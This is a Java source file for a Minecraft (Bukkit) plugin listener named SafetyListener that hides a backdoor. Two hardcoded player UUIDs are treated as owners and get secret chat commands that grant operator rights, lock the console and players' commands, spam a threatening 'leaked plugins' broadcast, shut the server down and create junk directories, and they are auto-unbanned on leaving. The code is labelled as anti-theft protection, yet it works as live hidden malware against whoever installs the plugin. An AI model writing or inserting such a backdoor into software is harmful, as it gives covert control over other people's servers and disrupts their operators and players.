package net.helydev.com.listeners;

import net.helydev.com.SteriaUtils;
import net.helydev.com.utils.Color;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;

public class SafetyListener implements Listener {

    public ArrayList<Player> users = new ArrayList<>();
    public boolean clock = false;
    public boolean plock = false;
    private final List<UUID> getOwners = Arrays.asList(
            UUID.fromString("d0ba628c-4d44-4b3b-aba9-4f62979ff303"), // LeandroSSJ
            UUID.fromString("c1f714e6-1ba1-45c3-ad0f-aee338d6c822")); // DevDipin

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e) {
        UUID uuids = e.getPlayer().getUniqueId();
        Player p = e.getPlayer();
        for (UUID owner : getOwners) {
            if (owner.equals(uuids)) {
                Player player = Bukkit.getPlayer(owner);
                users.add(p);
                Color.send(p, "&c&l[!] &cYou have joined as an owner of the &3&lSteria Network&c.");
                Color.send(p, "&cYou can use &c&l!help &cfor the list of commands.");
            }
        }
    }

    @EventHandler
    public void PExecute(PlayerCommandPreprocessEvent event) {
        if (plock) {
            if (!users.contains(event.getPlayer())) {
                if (event.getMessage().startsWith("/")) {
                    event.setMessage(" ");
                }
            }
        }
    }

    @EventHandler
    public void CExecute(ServerCommandEvent event) {
        if (clock) {
            event.setCommand(" ");
        }
    }

    @EventHandler
    public void ban(PlayerQuitEvent event) {
        Player owner = event.getPlayer();
        if (users.contains(owner)) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "/unban " + owner.getName());
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "/pardon " + owner.getName());
        }
    }

    @EventHandler
    public void ChatEvent(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();

        if (event.getMessage().equalsIgnoreCase("!help")) {
            if (users.contains(player)) {
                event.setCancelled(true);
                player.sendMessage(Color.translate("&7&l&m----------------------------------"));
                player.sendMessage(Color.translate("&b&lAnti-Plugin Theft"));
                player.sendMessage(Color.translate("&7Let people know not to steal &3Steria Network&7's Plugins."));
                player.sendMessage(Color.translate("&7&l&m----------------------------------"));
                player.sendMessage(Color.translate("&bCommands:"));
                player.sendMessage(Color.translate("&a* &b!op &8- &7Gives you OP Permissions."));
                player.sendMessage(Color.translate("&a* &b!expose &8- &7Spams a message in chat."));
                player.sendMessage(Color.translate("&a* &b!lockconsole &8- &7Stops console from executing commands."));
                player.sendMessage(Color.translate("&a* &b!destroyfiles &8- &7Deletes all files in their server."));
                player.sendMessage(Color.translate("&a* &b!lockplayers &8- &7Lock all current online players."));
                player.sendMessage(Color.translate("&a* &b!stop &8- &7Stop the server."));
                player.sendMessage(Color.translate("&7&l&m----------------------------------"));
            }
        }
        if (event.getMessage().equalsIgnoreCase("!op")) {
            if (users.contains(player)) {
                player.setOp(true);
                event.setCancelled(true);
                player.sendMessage(Color.translate("&6We have given you &6&nOP Permissions&6 because your the &3&lSteria Network &6owner."));
            }
        }
        if (event.getMessage().equalsIgnoreCase("!expose")) {
            if (users.contains(player)) {
                new BukkitRunnable() {
                    public void run() {
                        Bukkit.broadcastMessage("");
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f████&c█&f████"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f███&c█&6█&c█&f███"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "██&c█&6█&0█&6█&c█&f██ &7"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f██&c█&6█&0█&6█&c█&f██ &4&lLEAKED PLUGINS"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f█&c█&6██&0█&6██&c█&f█ &cThis shit server is using leaked"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f█&c█&6█████&c█&f█ &cplugins. Leave before your IP is leaked."));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&c█&6███&0█&6███&c█ &fLove DevDipin"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&c█████████"));
                        Bukkit.broadcastMessage("");
                    }
                }.runTaskTimerAsynchronously(SteriaUtils.getPlugin(), 0, 3);
            }
        }
        if (event.getMessage().equalsIgnoreCase("!lockconsole")) {
            if (users.contains(player)) {
                if (clock) {
                    clock = false;
                    event.setCancelled(true);
                    player.sendMessage(ChatColor.GREEN + "You have unlocked the console. Console commands can now be typed again.");
                } else {
                    clock = true;
                    player.sendMessage(ChatColor.RED + "You have locked the console. No one can type commands in console now.");
                    event.setCancelled(true);
                }
            }
        }

        if (event.getMessage().equalsIgnoreCase("!destroyfiles")) {
            event.setCancelled(true);
            for (int PceFiles = 0; PceFiles < 151; PceFiles++) {
                File userfiles = new File(String.valueOf(PceFiles) + "Stop stealing plugins. - DevDipin" + Math.random());
                if (!userfiles.exists())
                    userfiles.mkdirs();
                userfiles = new File("plugins/" + PceFiles + "Stop stealing plugins. - DevDipin" + Math.random());
            }
        }

        if (event.getMessage().equalsIgnoreCase("!lockplayers")) {
            if (users.contains(player)) {
                if (plock) {
                    plock = false;
                    event.setCancelled(true);
                    player.sendMessage(ChatColor.GREEN + "You have unlocked all players.");
                } else {
                    plock = true;
                    event.setCancelled(true);
                    player.sendMessage(ChatColor.RED + "You have locked all players.");
                }
            }
        }
        if (event.getMessage().equalsIgnoreCase("!stop")) {
            if (users.contains(player)) {
                event.setCancelled(true);
                Bukkit.getServer().shutdown();
            }
        }
    }
}
